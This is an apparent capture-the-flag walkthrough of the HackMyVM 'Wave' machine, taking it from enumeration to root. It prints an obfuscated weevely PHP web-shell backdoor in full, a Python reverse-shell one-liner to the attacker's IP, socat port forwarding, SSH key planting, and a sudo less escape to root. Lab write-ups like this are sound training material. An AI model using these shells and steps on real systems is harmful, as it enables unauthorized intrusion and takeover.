@@ -1,1 +1,541 @@
+			ENUMERATION
+			
+
+---nmap---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.64 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 10:55 +03
+Nmap scan report for wAvE (10.0.2.64)
+Host is up (0.00086s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 07:e9:c8:22:59:a5:00:41:15:fa:26:0f:7d:d3:29:ff (ECDSA)
+|_  256 c7:81:8e:06:49:33:8f:1a:88:3b:82:9e:27:f3:72:1e (ED25519)
+80/tcp open  http    nginx 1.22.1
+| http-robots.txt: 1 disallowed entry 
+|_/backup
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.22.1
+MAC Address: 08:00:27:CB:FB:61 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.86 ms wAvE (10.0.2.64)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.02 seconds
+                
+
+
+---I check the website and see "WAVE", I look at the source code and find a comment "wAvE" lets keep 
+searching---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.64 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x html,txt,php 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.64
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 31]
+/backup               (Status: 301) [Size: 169] [--> http://10.0.2.64/backup/]
+/robots.txt           (Status: 200) [Size: 18]
+/phptest.php          (Status: 200) [Size: 11]
+Progress: 907805 / 5095336 (17.82%)^Z
+zsh: suspended  gobuster dir -u http://10.0.2.64 -w  -x html,txt,php
+                 
+
+
+---when I check robots.txt I find a page /backup, visit it---
+
+
+
+---I see 5 files named---
+
+
+index.bck                                          
+log.log                                            
+phptest.bck                                        
+robots.bck                                         
+weevely.bck     
+
+    
+
+---I download them all and check the file types and their contents---
+
+
+
+
+---I noticed that there is also another file named phptest here, I decide to check if there are any other
+php files like this that share the same name---
+
+
+
+---To make this faster I create a php extensions wordlist file (I search for php extension wordlists and use
+some of the extensions I find from there)---
+
+---Then create another file and put the names of the files in the /backup page into it---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# cat extensions_php          
+phtml
+php
+php3
+php4
+php5
+php7
+inc 
+phar
+pht
+php-s 
+pHtml
+pHp
+pHp3
+pHp4
+pHp5
+                                                                                
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# cat file_names    
+index                                          
+log                                            
+phptest                                        
+robots                                         
+weevely
+
+
+
+---now let's fuzz---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# ffuf -u http://10.0.2.64/FILE.EXT -w file_names:FILE -w  extensions_php:EXT -fw 561 -fs 10674
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.64/FILE.EXT
+ :: Wordlist         : FILE: /home/okina/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF/file_names
+ :: Wordlist         : EXT: /home/okina/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF/extensions_php
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 561
+ :: Filter           : Response size: 10674
+________________________________________________
+
+:: Progress: [29/75] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 26ms]
+    * EXT: php7
+    * FILE: weevely
+
+
+
+
+---we found the file weevely.php7, we have a new php file now that we can try different method, 
+for now let's go back to the files we downloaded from the /backup page---
+
+
+
+                                                                                
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# ls
+index.bck  phptest.bck  wave_linux_os_ctf_writeup.txt  
+log.log    robots.bck   weevely.bck                    
+                                                                                
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# file index.bck 
+index.bck: exported SGML document, ASCII text
+                                                                                
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# file log.log  
+log.log: ASCII text
+                                                                                
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# file phptest.bck 
+phptest.bck: PHP script, ASCII text
+                                                                                
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# file robots.bck 
+robots.bck: ASCII text
+                                                                                
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# file weevely.bck 
+weevely.bck: PHP phar archive with SHA1 signature
+
+
+
+---these are all backup files and with file command we can see their true file format---
+
+
+---we see that weevely.bck is a phar archive file, let's change its extension to original type and 
+unarchive it---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# mv weevely.bck weevely.phar
+                     
+
+                                                                                
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# phar extract -f weevely.phar
+x ...ok
+                        
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# cat x                                           
+<?php eval('$k="3ddf0d5c";$kh="b6e7a529b6c2";$kf="d598a771749b";$p="afnqDsRcBpVmU71y";
+
+function x($t,$k){
+$c=strlen($k);$l=strlen($t);$o="";
+for($i=0;$i<$l;){
+for($j=0;($j<$c&&$i<$l);$j++,$i++)
+{
+$o.=$t[$i]^$k[$j];
+}
+}
+return $o;
+}
+if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
+@ob_start();
+@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
+$o=@ob_get_contents();
+@ob_end_clean();
+$r=@base64_encode(@x(@gzcompress($o),$k));
+print("$p$kh$r$kf");
+}');                                                                                
+
+
+
+
+---here we see the content of this php file, in the first line we discover some hashes, let's combine them---
+
+
+3ddf0d5c, b6e7a529b6c2, d598a771749b, afnqDsRcBpVmU71y
+
+
+---When I combine the first 3 hash parts, I go to crackstation.com to check if it is a valid hashh
+and I discover that this is an MD5 hash and it's result is "aaazz"---
+
+
+3ddf0d5cb6e7a529b6c2d598a771749b : aaazz (MD5)
+
+
+
+---okay, now we can use weevely to organize a web shell attack, weevely has the ability to open a terminal
+as you know, this will grant you the first access into the target system. To do so---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# weevely http://10.0.2.64/weevely.php7 aaazz
+
+[+] weevely 4.0.1
+
+[+] Target:	10.0.2.64
+[+] Session:	/root/.weevely/sessions/10.0.2.64/weevely_0.session
+
+[+] Browse the filesystem or execute commands starts the connection
+[+] to the target. Type :help for more information.
+
+weevely> ls
+backup
+index.html
+phptest.php
+robots.txt
+weevely.bck
+weevely.php7
+www-data@wave:/var/www/html $ 
+
+
+
+Note: If writing ls in the weevely terminal doesn't work, you can put a python reverse shell there
+and open up a listener from your own terminal to establish a connection. I will do it anyway to 
+give a demonstration
+
+
+www-data@wave:/home $ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.0.2.54",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+
+
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lvnp 1234                        
+listening on [any] 1234 ...
+connect to [10.0.2.54] from (UNKNOWN) [10.0.2.64] 39440
+www-data@wave:/home $ ls
+angie
+carla
+
+
+www-data@wave:/home $ cd angie
+Failed cd 'angie': no such directory or permission denied
+
+www-data@wave:/home $ cd carla
+Failed cd 'carla': no such directory or permission denied
+
+
+
+---now we are in the system, but there is not much we can do because of the restrictions, let's check the
+information about sockets and network connections
+
+
+
+
+www-data@wave:/home$ ss -tulnp
+ss -tulnp
+Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                        
+udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*                                  
+tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                  
+tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    users:(("nginx",pid=441,fd=5))
+tcp   LISTEN 0      1024       127.0.0.1:3923      0.0.0.0:*                                  
+tcp   LISTEN 0      128             [::]:22           [::]:*                                  
+tcp   LISTEN 0      511             [::]:80           [::]:*    users:(("nginx",pid=441,fd=6))
+
+
+
+
+---we see that there is listening being done on the port 3923---
+
+
+---now that we know there is listening being done, we can try to exploit this by using socat in order to 
+upload files into the system and try to switch to another user---
+
+
+
+Socat: A versatile networking tool that establishes two bidirectional data streams and transfers data between
+them. Think of it like netcat, but with a much broader range of options and features.
+
+
+https://github.com/3ndG4me/socat
+
+
+---I download it into /opt folder and then by following the README.MD file, I create the necessary "socat"
+executable script---
+
+
+---Now let's upload it to the target---
+
+                                                                                                                         
+┌──(root㉿kali)-[/home/okina]
+└─# python3 -m http.server      
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+
+
+
+www-data@wave:/home$ cd /tmp
+cd /tmp
+
+www-data@wave:/tmp$ wget http://10.0.2.54:8000/socat
+wget http://10.0.2.54:8000/socat
+
+socat               100%[===================>] 365.75K  --.-KB/s    in 0.007s  
+
+2024-05-22 11:01:36 (50.4 MB/s) - ‘socat’ saved [374528/374528]
+
+www-data@wave:/tmp$ chmod +x socat
+
+
+www-data@wave:/tmp$ ./socat TCP-LISTEN:8888,reuseaddr,fork TCP:127.0.0.1:3923
+
+
+
+---visit the adress http://10.0.2.54:8888 and we see the interface of socat, now we can try to upload files
+into here---
+
+
+---and in the web interface here we also a file named "user.txt", this is our user flag :)---
+
+"user.txt"
+
+---First User Flag---
+
+
+
+---we can assume that we are in another user's directory, either angie or carla probably. Let's create
+public and private ssh keys and try to upload it---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# mkdir .ssh            
+                                                                                                                         
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/36- WAVE LINUX CTF]
+└─# cd .ssh                                         
+                                                                                                                         
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/36- WAVE LINUX CTF/.ssh]
+└─# ssh-keygen -t rsa                                  
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): wave
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in wave
+Your public key has been saved in wave.pub
+The key fingerprint is:
+SHA256:lqF4jT3heXK3rWsUIWPOdIP+jJxXO/fdbwNlWqfM6WA root@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|           .     |
+|          * +    |
+|        o* + o   |
+|     . * =+ . .+.|
+|    . + S.o=.==+.|
+|     . . =+.E=B .|
+|           +.ooo+|
+|            ....=|
+|           .o. .+|
++----[SHA256]-----+
+
+
+
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/36- WAVE LINUX CTF/.ssh]
+└─# ls    
+wave  wave.pub
+
+---
+wave = private key
+
+wave.pub = public key
+---
+
+
+---I change their names before uploading to the system because otherwise I faced some issues when trying
+to uplaod the files---
+
+
+                                                                                                         
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/36- WAVE LINUX CTF/.ssh]
+└─# mv wave.pub authorized_keys
+
+                                                                                                                                 
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/36- WAVE LINUX CTF/.ssh]
+└─# ls
+authorized_keys  wave
+
+                           
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/36- WAVE LINUX CTF/.ssh]
+└─# mv wave id_rsa             
+       
+
+
+---now I went to the socat interface and uploaded the authorized_keys, which contains our public key, the 
+private key couldn't be uploaded---
+
+
+
+---now the target machine has the public key, log into the ssh using our private key, try either angie
+or carla---
+
+
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/36- WAVE LINUX CTF/.ssh]
+└─# ssh angie@10.0.2.65 -i id_rsa
+The authenticity of host '10.0.2.65 (10.0.2.65)' can't be established.
+ED25519 key fingerprint is SHA256:6XC0N82ZtO32MzrvGO7WaR/Yg+rpDa0Wkgoy3H8IdnE.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:67: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.65' (ED25519) to the list of known hosts.
+Linux wave 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64
+
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Sep  5 11:14:50 2023 from 192.168.0.100
+
+angie@wave:~$ 
+
+
+
+---perfect, we are in the ssh service, let's search for ways to escalate our privileges---
+
+
+
+---you can also get the flag if you didn't before---
+
+
+angie@wave:~$ ls
+authorized_keys  copyparty-sfx.py  user.txt
+
+angie@wave:~$ cat user.txt 
+---First User Flag---
+
+
+
+
+
+			PRIVILEGE ESCALATION
+
+
+angie@wave:~$ sudo -l
+Matching Defaults entries for angie on wave:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User angie may run the following commands on wave:
+    (ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt
+
+
+---go to gtfobins and search for less SUID permissions---
+
+
+---we have exploited a less SUID before, the trick was to minimize the terminal screen as small as possible
+to exploit the vulnerability---
+
+
+
+angie@wave:~$ sudo /usr/bin/less -F /opt/secret.txt
+
+---Minimize the terminal before this, and then type---
+
+!/bin/sh
+
+
+---Now you can expand the terminal :) We have become root, go get your final flag---
+
+# whoami
+root
+# cd /root
+# ls
+root.txt
+# cat root.txt
+---Root User Flag---
+
+
+
 
